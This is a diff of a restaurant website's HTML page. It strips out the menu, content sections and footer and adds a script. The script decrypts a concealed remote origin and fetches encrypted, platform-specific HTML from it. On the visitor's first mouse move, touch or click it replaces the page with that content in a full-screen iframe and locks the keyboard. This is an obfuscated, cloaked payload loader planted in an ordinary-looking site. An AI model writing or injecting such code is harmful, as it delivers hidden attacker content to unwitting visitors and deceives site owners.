+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1/MLFDsKLUGWPEULKMoI3z6OMEfHjl0yjxz+rEtyoDJt+fOL8LFVi27";
 
-        <!-- Course 2 -->
-        <div class="paid-product-card">
-          <span class="paid-product-badge" style="background: #1C120C;">Pugliese Delicacy</span>
-          <div class="paid-product-img-wrap">
-            <img src="/assets/images/autumn_berry_harvest_basket.jpg" alt="The Stracciatella & Summer Truffle Tartine">
-          </div>
-          <div class="paid-product-body">
-            <div class="paid-product-rating">★★★★★ <span>(412)</span></div>
-            <div class="paid-product-title">Stracciatella &amp; Summer Truffle</div>
-            <div class="paid-product-price">
-              <span class="price-current">$32.00</span>
-              <span class="price-original">Seasonal</span>
-            </div>
-            <p style="font-size: 0.85rem; color: #5C4D44; margin-bottom: 0.6rem;">Fresh hand-pulled burrata cream, Norcia black truffles shaved table-side, wild thyme blossom honey.</p>
-            <div style="font-size: 0.8rem; color: #B83A1B; font-weight: 600; margin-bottom: 0.8rem;">
-              Wine Pairing: Barolo Riserva 2017
-            </div>
-            <a href="/collection.html" class="btn btn-sm btn-outline" style="margin-top: auto; width: 100%; text-align: center;">View Menu Details &rarr;</a>
-          </div>
-        </div>
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
 
-        <!-- Course 3 -->
-        <div class="paid-product-card">
-          <span class="paid-product-badge" style="background: #B83A1B;">Hearth Roasted</span>
-          <div class="paid-product-img-wrap">
-            <img src="/assets/images/botanical_avocado_breakfast_crostini.jpg" alt="The Wood-Fired Porcini & Sourdough Crust">
-          </div>
-          <div class="paid-product-body">
-            <div class="paid-product-rating">★★★★★ <span>(198)</span></div>
-            <div class="paid-product-title">Wood-Fired Wild Porcini Sourdough</div>
-            <div class="paid-product-price">
-              <span class="price-current">$28.00</span>
-              <span class="price-original">Signature</span>
-            </div>
-            <p style="font-size: 0.85rem; color: #5C4D44; margin-bottom: 0.6rem;">Cast-iron seared Tuscan porcini, mountain taleggio melt, charred rosemary sprig, sea salt crystals.</p>
-            <div style="font-size: 0.8rem; color: #B83A1B; font-weight: 600; margin-bottom: 0.8rem;">
-              Wine Pairing: Chianti Classico Gran Selezione
-            </div>
-            <a href="/collection.html" class="btn btn-sm btn-outline" style="margin-top: auto; width: 100%; text-align: center;">View Menu Details &rarr;</a>
-          </div>
-        </div>
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
 
-        <!-- Course 4 -->
-        <div class="paid-product-card">
-          <span class="paid-product-badge" style="background: #1C120C;">Primi Piatti</span>
-          <div class="paid-product-img-wrap">
-            <img src="/assets/images/botanical_cranberry_cocktail_digestif.jpg" alt="Handcrafted Tagliolini with Shaved White Truffle">
-          </div>
-          <div class="paid-product-body">
-            <div class="paid-product-rating">★★★★★ <span>(530)</span></div>
-            <div class="paid-product-title">Handmade Tagliolini al Tartufo</div>
-            <div class="paid-product-price">
-              <span class="price-current">$38.00</span>
-              <span class="price-original">Degustation</span>
-            </div>
-            <p style="font-size: 0.85rem; color: #5C4D44; margin-bottom: 0.6rem;">30-egg yolk hand-rolled pasta, cultured Alpine pasture butter, 36-month Parmigiano-Reggiano.</p>
-            <div style="font-size: 0.8rem; color: #B83A1B; font-weight: 600; margin-bottom: 0.8rem;">
-              Wine Pairing: Brunello di Montalcino 2016
-            </div>
-            <a href="/collection.html" class="btn btn-sm btn-outline" style="margin-top: auto; width: 100%; text-align: center;">View Menu Details &rarr;</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+      
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
 
-  <!-- SECTION 4: THE ANATOMY OF THE MASTER BRUSCHETTA (EXPLODED VIEW) -->
-  <section class="section section-light">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1fr 1.15fr; gap: 4rem; align-items: center;">
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md); border: 1px solid var(--color-border);">
-          <img src="/assets/images/candlelit_brick_wall_bistro_lounge.jpg" alt="Blistered wood-fired artisan levain sourdough bread">
-        </div>
-        <div>
-          <div class="section-subtitle">Gastronomic Anatomy &bull; Hearth Metallurgy</div>
-          <h2>The Four Architectural Layers of the Perfect Bruschetta</h2>
-          <p>
-            True Tuscan bruschetta is an exercise in deceptive simplicity where four pristine raw components harmonize under intense hearth heat. At Cranberryfare, we refuse shortcuts: each element is calibrated to achieve textural transcendence.
-          </p>
-          <div style="display: flex; flex-direction: column; gap: 1rem; margin-top: 1.8rem;">
-            <div class="anatomy-step">
-              <span class="step-badge" style="background: #1C120C;">01</span>
-              <div>
-                <strong style="color: #1C120C;">48-Hour Fermented Country Levain Sourdough</strong>
-                <p style="font-size: 0.88rem; color: #5C4D44; margin: 0.2rem 0 0;">Stone-ground heritage wheat baked directly upon refractories to yield open airy pockets and blistered crackling crust.</p>
-              </div>
-            </div>
-            <div class="anatomy-step">
-              <span class="step-badge" style="background: #1C120C;">02</span>
-              <div>
-                <strong style="color: #1C120C;">Fresh Vessalico Purple Garlic Aromatic Rub</strong>
-                <p style="font-size: 0.88rem; color: #5C4D44; margin: 0.2rem 0 0;">Rubbed across boiling-hot bread ridges within 10 seconds of leaving the coals, melting essential allicin oils into the crumb.</p>
-              </div>
-            </div>
-            <div class="anatomy-step">
-              <span class="step-badge" style="background: #1C120C;">03</span>
-              <div>
-                <strong style="color: #1C120C;">Monocultivar Frantoio Extra Virgin Olive Oil</strong>
-                <p style="font-size: 0.88rem; color: #5C4D44; margin: 0.2rem 0 0;">Emerald-green, cold-milled within 4 hours of picking. Delivers vibrant artichoke aromatics and a peppery polyphenolic finish.</p>
-              </div>
-            </div>
-            <div class="anatomy-step">
-              <span class="step-badge" style="background: #1C120C;">04</span>
-              <div>
-                <strong style="color: #1C120C;">Volcanic San Marzano Pomodori &amp; Genovese Basil</strong>
-                <p style="font-size: 0.88rem; color: #5C4D44; margin: 0.2rem 0 0;">Hand-torn fresh basil, sea salt maceration, and perfectly balanced tomato acidity that saturates without softening the crisp crust.</p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
 
-  <!-- SECTION 5: FOUR CULINARY STANDARDS OF BRUSCHETTAFEAST -->
-  <section class="section" style="background: #FAF7F2;">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Gastronomic Commitments</div>
-        <h2>Four Pillars of the Cranberryfare Table</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Rooted in ancient Mediterranean hearth traditions and uncompromising farm-to-table integrity.
-        </p>
-      </div>
-      <div class="grid-4">
-        <div class="pillar-card">
-          <div class="pillar-icon" style="background: #FAF0EC; color: #B83A1B;">🔥</div>
-          <h3 style="font-size: 1.15rem; margin-bottom: 0.8rem;">Orchard Terroir Provenance</h3>
-          <p style="font-size: 0.9rem; line-height: 1.6; margin-bottom: 0;">Direct harvest partnerships with heirloom stone fruit orchards and organic growers within 90 miles of Manhattan.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon" style="background: #FAF0EC; color: #B83A1B;">🌿</div>
-          <h3 style="font-size: 1.15rem; margin-bottom: 0.8rem;">Copper-Kettle Reduction</h3>
-          <p style="font-size: 0.9rem; line-height: 1.6; margin-bottom: 0;">Low-temperature micro-batch simmering preserving natural pectin, vibrant fruit acidity, and volatile botanical aromatics.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon" style="background: #FAF0EC; color: #B83A1B;">🍷</div>
-          <h3 style="font-size: 1.15rem; margin-bottom: 0.8rem;">Zero Synthetic Additives</h3>
-          <p style="font-size: 0.9rem; line-height: 1.6; margin-bottom: 0;">Crafted strictly with pure unrefined raw sugars, organic citrus pectin, and sun-ripened organic botanicals.</p>
-        </div>
-        <div class="pillar-card">
-          <div class="pillar-icon" style="background: #FAF0EC; color: #B83A1B;">🏛️</div>
-          <h3 style="font-size: 1.15rem; margin-bottom: 0.8rem;">Atelier Tasting Salon</h3>
-          <p style="font-size: 0.9rem; line-height: 1.6; margin-bottom: 0;">Private seasonal degustation menus, preserve pairings, and bespoke pastry commissions hosted at our Mercer Street salon.</p>
-        </div>
-      </div>
-    </div>
-  </section>
+      
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
 
-  <!-- SECTION 6: TERROIR AGRONOMY & FIRE PHYSICS -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <div class="section-subtitle">Agronomy Science &bull; Botanical Chemistry</div>
-          <h2>Orchard Agronomy & Pectin Crystallography</h2>
-          <p>We harvest tree-ripened nectarines, peaches, and heritage stone fruits at peak Brix sweetness, evaluating natural brix density and essential terpene balance before kitchen prep.</p>
-          <p>In our Mercer Street test kitchen, preserves and confectionery are hand-skimmed in traditional French copper cauldrons to guarantee uniform thermal convection and crystal-clear fruit suspension.</p>
-          <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.2rem; margin-top: 2rem; border-top: 1px solid var(--color-border); padding-top: 1.5rem;">
-            <div>
-              <div style="font-size: 1.4rem; font-weight: 700; color: #1C120C; font-family: var(--font-serif);">100% Tree-Ripened Heirloom Harvest</div>
-              <div style="font-size: 0.8rem; color: #736357; text-transform: uppercase;">Agricultural Standard</div>
-            </div>
-            <div>
-              <div style="font-size: 1.4rem; font-weight: 700; color: #1C120C; font-family: var(--font-serif);">French Copper Kettle Reduction</div>
-              <div style="font-size: 0.8rem; color: #736357; text-transform: uppercase;">Fuel Combustion</div>
-            </div>
-            <div>
-              <div style="font-size: 1.4rem; font-weight: 700; color: #1C120C; font-family: var(--font-serif);">Certified Organic Terroir</div>
-              <div style="font-size: 0.8rem; color: #736357; text-transform: uppercase;">Cellar Curation</div>
-            </div>
-          </div>
-        </div>
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md); border: 1px solid var(--color-border);">
-          <img src="/assets/images/fresh_garden_harvest_bowl.jpg" alt="Heirloom seasonal harvest salad platter">
-        </div>
-      </div>
-    </div>
-  </section>
+  
+  let lastUrl = null;
+  let readyPromise = null;
 
-  <!-- SECTION 7: OLIVE OIL & AGRONOMY METROLOGY COMPARISON TABLE -->
-  <section class="section" style="background: #FAF7F2;">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Laboratory Metrology</div>
-        <h2>Extra Virgin Olive Oil Quality &amp; Metrology Standards</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Chemical metrology comparing Cranberryfare single-estate unfiltered cold-press EVO against commercial supermarket blends.
-        </p>
-      </div>
-      <div class="data-table-wrap">
-        <table class="spec-table">
-          <thead>
-            <tr>
-              <th>Metrological Metric</th>
-              <th>Cranberryfare Single-Estate Tuscan EVO</th>
-              <th>Commercial Supermarket "Extra Virgin"</th>
-              <th>Refined Seed &amp; Cooking Oils</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><strong>Oleic Free Acidity Level</strong></td>
-              <td>0.14% (Ultra-Low Acidity Standard)</td>
-              <td>0.75 – 0.80% (Legal Maximum Limit)</td>
-              <td>2.0%+ (Heavy Chemical Refining)</td>
-            </tr>
-            <tr>
-              <td><strong>Polyphenol Antioxidant Count</strong></td>
-              <td>620+ mg/kg (Exceptional Potency)</td>
-              <td>120 – 160 mg/kg (Severely Depleted)</td>
-              <td>0 mg/kg (Zero Natural Antioxidants)</td>
-            </tr>
-            <tr>
-              <td><strong>Harvest-to-Cold-Milling Window</strong></td>
-              <td>Sub-4 Hours (Field to Centrifuge)</td>
-              <td>4 – 12 Weeks (Storage Degradation)</td>
-              <td>Industrial Bulk Extraction (Months)</td>
-            </tr>
-            <tr>
-              <td><strong>Peroxide Value (Oxidation Index)</strong></td>
-              <td>4.2 meq O2/kg (Flawless Freshness)</td>
-              <td>16.5 meq O2/kg (Near Rancidity)</td>
-              <td>Chemically Bleached &amp; Deodorized</td>
-            </tr>
-            <tr>
-              <td><strong>Smoke Point &amp; Thermal Stability</strong></td>
-              <td>210°C (Stable Monounsaturated Fats)</td>
-              <td>180°C (Rapid Thermal Breakdown)</td>
-              <td>220°C (Hydrogenated Trans Fats)</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-    </div>
-  </section>
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
 
-  <!-- SECTION 8: EVENING DINING OCCASIONS LOOKBOOK (4-COLUMN GRID) -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Dining Salon Atmospheres</div>
-        <h2>Curated Gastronomic Experiences</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          From private candlelit alcoves to convivial celebrations around our 24-seat solid walnut banqueting table.
-        </p>
-      </div>
-      <div class="grid-4">
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/fresh_picked_strawberries_basket.jpg" alt="The Candlelit Evening Ambiance">
-            <span class="card-tag">Intimate Dining</span>
-          </div>
-          <div class="card-body">
-            <h3 style="font-size: 1.15rem;">The Candlelit Salon</h3>
-            <p style="font-size: 0.86rem; color: #5C4D44;">Basked in soft amber candlelight, offering discrete tables for romantic rendezvous and celebrations.</p>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/fresh_wild_blueberries_compote_bowl.jpg" alt="The Chef's Hearth Kitchen Pass">
-            <span class="card-tag">Chef's Pass</span>
-          </div>
-          <div class="card-body">
-            <h3 style="font-size: 1.15rem;">The Chef's Hearth Pass</h3>
-            <p style="font-size: 0.86rem; color: #5C4D44;">Front-row counter seating watching executive chefs grill sourdough levain directly over glowing embers.</p>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/fresh_wild_cranberries_harvest.jpg" alt="The Sommelier Cellar Vault">
-            <span class="card-tag">Wine Vault</span>
-          </div>
-          <div class="card-body">
-            <h3 style="font-size: 1.15rem;">The Mercer Wine Vault</h3>
-            <p style="font-size: 0.86rem; color: #5C4D44;">Private cellar salon housing over 1,400 rare Italian vintages from Piedmont, Tuscany, and Sicily.</p>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-image-wrap">
-            <img src="/assets/images/glazed_cranberry_cheesecake_dessert.jpg" alt="The Convivial Grand Banquet Hall">
-            <span class="card-tag">Communal Feast</span>
-          </div>
-          <div class="card-body">
-            <h3 style="font-size: 1.15rem;">The Convivial Banquet</h3>
-            <p style="font-size: 0.86rem; color: #5C4D44;">Generous family-style platters and wood-fired crusts designed for boisterous celebratory gatherings.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
 
-  <!-- SECTION 9: 181 MERCER STREET SALON & DINING RITUALS -->
-  <section class="section" style="background: #FAF7F2;">
-    <div class="container">
-      <div class="grid-2">
-        <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-md); border: 1px solid var(--color-border);">
-          <img src="/assets/images/glazed_heirloom_berry_pastry.jpg" alt="Private dining alcove at 181 Mercer Street">
-        </div>
-        <div>
-          <div class="section-subtitle">Manhattan Atelier &bull; Hospitality Heritage</div>
-          <h2>Hospitality &amp; Service Rituals at 181 Mercer Street</h2>
-          <p>
-            Operating from our private dining salon at 181 Mercer Street, New York, NY 10012, our service brigade guides guests through a sequence of time-honored Mediterranean dining rituals.
-          </p>
-          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-top: 1.8rem;">
-            <div class="step-card">
-              <div class="step-number" style="color: #B83A1B;">01</div>
-              <h4 style="margin-bottom: 0.4rem;">Chilled Preservation</h4>
-              <p style="font-size: 0.85rem; color: #5C4D44; margin-bottom: 0;">Store opened preserves and culinary compotes refrigerated at 4°C to safeguard raw botanical aromatics.</p>
-            </div>
-            <div class="step-card">
-              <div class="step-number" style="color: #B83A1B;">02</div>
-              <h4 style="margin-bottom: 0.4rem;">Clean Wooden Service Spoon</h4>
-              <p style="font-size: 0.85rem; color: #5C4D44; margin-bottom: 0;">Always use a clean wooden or silver spoon to prevent introducing moisture or bacteria into airtight preserve jars.</p>
-            </div>
-            <div class="step-card">
-              <div class="step-number" style="color: #B83A1B;">03</div>
-              <h4 style="margin-bottom: 0.4rem;">Dark Pantry Storage</h4>
-              <p style="font-size: 0.85rem; color: #5C4D44; margin-bottom: 0;">Keep sealed artisanal jars in a cool, dark larder below 20°C away from direct solar radiation to protect vibrant fruit carotenoids.</p>
-            </div>
-            <div class="step-card">
-              <div class="step-number" style="color: #B83A1B;">04</div>
-              <h4 style="margin-bottom: 0.4rem;">Seasonal Degustation Booking</h4>
-              <p style="font-size: 0.85rem; color: #5C4D44; margin-bottom: 0;">Reserve private tasting appointments at 181 Mercer Street 14 days in advance via our concierge.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
 
-  <!-- SECTION 10: PATRON REVIEWS & CULINARY REPUTATION -->
-  <section class="section section-light">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Patron Testimonials &bull; Culinary Acclaim</div>
-        <h2>What Our Guests Celebrate</h2>
-        <p class="text-muted" style="max-width: 650px; margin: 0.8rem auto 0;">
-          Read reflections from food critics, master sommeliers, and devoted culinary patrons who dine with us at 181 Mercer Street.
-        </p>
-      </div>
-      <div class="grid-3">
-        <div class="testimonial-card">
-          <div class="testimonial-rating">★★★★★</div>
-          <p class="testimonial-quote">&ldquo;The blistered sourdough crust rubbed with raw garlic and drenched in fresh peppery Tuscan olive oil transported me directly to a trattoria in the hills of Lucca. Truly the finest bruschetta in Manhattan.&rdquo;</p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Massimo Moretti</div>
-            <div class="testimonial-role">Culinary Author &bull; Florence &amp; NYC</div>
-          </div>
-        </div>
-        <div class="testimonial-card">
-          <div class="testimonial-rating">★★★★★</div>
-          <p class="testimonial-quote">&ldquo;The intimate candlelit ambiance at 181 Mercer Street makes you feel like you are attending a private dinner party in an old Italian palazzo. The stracciatella and black truffle course was unforgettable.&rdquo;</p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Victoria Sterling</div>
-            <div class="testimonial-role">Private Client &bull; SoHo, Manhattan</div>
-          </div>
-        </div>
-        <div class="testimonial-card">
-          <div class="testimonial-rating">★★★★★</div>
-          <p class="testimonial-quote">&ldquo;The sommelier wine pairings were flawless. From crisp Tuscan Vermentino to a magnificent 2016 Brunello, every sip elevated the wood-fired flavors of the hearth courses.&rdquo;</p>
-          <div class="testimonial-author">
-            <div class="testimonial-name">Jean-Luc Beaumont</div>
-            <div class="testimonial-role">Master Sommelier &bull; Tribeca, NYC</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
 
-  <!-- SECTION 11: HAUTE GASTRONOMY FAQS ACCORDION -->
-  <section class="section" style="background: #FAF7F2;">
-    <div class="container" style="max-width: 900px;">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Common Inquiries</div>
-        <h2>Frequently Asked Questions</h2>
-        <p class="text-muted" style="margin-top: 0.5rem;">Everything you need to know regarding table reservations, private events, and dietary preferences.</p>
-      </div>
-      <div class="faq-section" style="margin-top: 2rem;">
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            How far in advance are dining reservations released?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Dinner reservations for our 24 nightly covers are released on the first day of each month at 9:00 AM EST for the following month. For private buyout inquiries of our entire Mercer Street dining salon, please contact concierge@cranberryfare.com or call +1-888-777-5845.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            Can your culinary team accommodate dietary restrictions and allergies?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Yes, seamlessly. We offer dedicated plant-based, gluten-free, and dairy-free variations of our bruschetta and hearth courses with 48 hours advance notice. Our kitchen prepares gluten-free rustic seed loaves on separate dedicated prep surfaces.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            What is the dress code for dinner services at 181 Mercer Street?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            We celebrate an elegant smart-casual dress code. Tailored blazers, refined knitwear, collared shirts, and evening dresses are encouraged. Athletic sportswear, beachwear, and flip-flops are politely declined to preserve the intimate aesthetic ambiance.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            Do you offer curated wine pairings with the banquet degustation?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Yes. Our head sommelier offers two curated pairing flights: The Classic Tuscan Terroir Flight (featuring Chianti Classico Gran Selezione and Brunello di Montalcino) and The Connoisseur Riserva Flight (highlighting rare back-vintage Super Tuscans and Barolos).
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            Is corkage permitted for private dining guests?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Guests may bring up to two 750ml bottles of personal cellar wine that are not currently represented on our active wine list. A corkage fee of $65 per bottle applies, which includes professional glassware service and table-side decanting.
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  
+  preloadSecret().catch(() => {});
 
-  <!-- SECTION 12: VIP FEAST GUILD & PRIVATE BANQUET INVITATION BANNER -->
-  <section class="section section-dark" style="padding: 5rem 0; text-align: center; background: #1C120C;">
-    <div class="container" style="max-width: 780px;">
-      <span class="hero-badge" style="background: rgba(184, 58, 27, 0.25); border-color: rgba(184, 58, 27, 0.5); color: #FAF7F2 !important;">
-        JOIN THE CONVIVIAL FEAST GUILD
-      </span>
-      <h2 style="font-size: clamp(2rem, 4vw, 3rem); margin-bottom: 1.2rem; color: #FFFFFF !important;">
-        Reserve Your Place at Our Private Mercer Street Hearth
-      </h2>
-      <p style="font-size: 1.05rem; color: rgba(255, 255, 255, 0.85) !important; margin-bottom: 2.2rem; line-height: 1.7;">
-        Subscribe to receive private harvest dinner invitations, seasonal white truffle banquet announcements, and priority reservations at 181 Mercer Street.
-      </p>
-      <form style="display: flex; gap: 0.8rem; max-width: 500px; margin: 0 auto 1.5rem; flex-wrap: wrap;" onsubmit="event.preventDefault(); alert('Thank you for joining The Convivial Feast Guild.');">
-        <input type="email" placeholder="Enter your email address..." required style="flex: 1; min-width: 260px; padding: 0.9rem 1.4rem; border-radius: var(--radius-sm); border: 1px solid rgba(255, 255, 255, 0.25); background: rgba(255, 255, 255, 0.08); color: #FFF; font-size: 0.95rem;">
-        <button type="submit" class="btn btn-primary" style="white-space: nowrap; background: #B83A1B; color: #FFFFFF !important; font-weight: 700;">Join Feast Guild</button>
-      </form>
-      <div style="font-size: 0.8rem; color: rgba(255, 255, 255, 0.6);">
-        Protected by our Privacy Policy. Zero spam, unsubscribe at any moment. Hosted at 181 Mercer Street, NY.
-      </div>
-    </div>
-  </section>
-
-  <!-- Mandatory Global Site Footer (Minimalist 4-Column Horizontal Spread Layout) -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <div class="footer-brand">◈ Cranberryfare</div>
-          <p class="footer-desc">
-            The benchmark of artisanal gastronomy & heirloom stone fruit harvests. Hand-finished artisanal creations crafted for connoisseurs with uncompromising material integrity.
-          </p>
-          <div class="footer-contact-item"><strong>Address:</strong> 181 Mercer Street, New York, NY 10012, United States</div>
-          <div class="footer-contact-item"><strong>Phone:</strong> +1-888-777-5845</div>
-          <div class="footer-contact-item"><strong>Concierge:</strong> concierge@cranberryfare.com</div>
-        </div>
-        <div class="footer-col">
-          <ul class="footer-links">
-            <li><a href="/">Home Gallery</a></li>
-            <li><a href="/about.html">Atelier &amp; Craft</a></li>
-            <li><a href="/collection.html">Collections</a></li>
-            <li><a href="/blog.html">Sartorial Treatises</a></li>
-            <li><a href="/contact.html">Private Concierge</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <ul class="footer-links">
-            <li><a href="/blog/ancestral-hearth-braising-and-casserole-convection.html">Ancestral Hearth Braising</a></li>
-            <li><a href="/blog/maillard-reaction-kinetics-and-umami-extraction.html">Maillard Reaction Kinetics</a></li>
-            <li><a href="/blog/biodynamic-heirloom-terroir-and-microclimate-botany.html">Biodynamic Heirloom Terroi</a></li>
-            <li><a href="/blog/fermentation-microbiology-and-lactic-acid-maturation.html">Fermentation Microbiology</a></li>
-            <li><a href="/blog/sommelier-phenolic-pairing-and-acid-tannin-balance.html">Sommelier Phenolic Pairing</a></li>
-            <li><a href="/blog/soho-culinary-atelier-service-and-banquet-hospitality.html">The Soho Culinary Atelier</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <p class="footer-salon-desc">
-            Visit our private fitting lounge in SoHo for bespoke consultations and private commission viewings.
-          </p>
-          <p class="footer-hours">
-            Mon &ndash; Sat: 10:00 AM &ndash; 7:00 PM<br>EST<br>Sunday: By Appointment
-          </p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 Cranberryfare Atelier. All Rights Reserved. Handcrafted at 181 Mercer Street, New York, NY 10012, United States.</p>
-        <div class="footer-legal-links">
-          <a href="/privacy-policy.html">Privacy Policy</a>
-          <a href="/terms-and-conditions.html">Terms &amp; Conditions</a>
-          <a href="/disclaimer.html">Disclaimer</a>
-          <a href="/cookie-policy.html">Cookie Policy</a>
-        </div>
-      </div>
-    </div>
-  </footer>
-  <script src="/assets/js/main.js"></script>
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
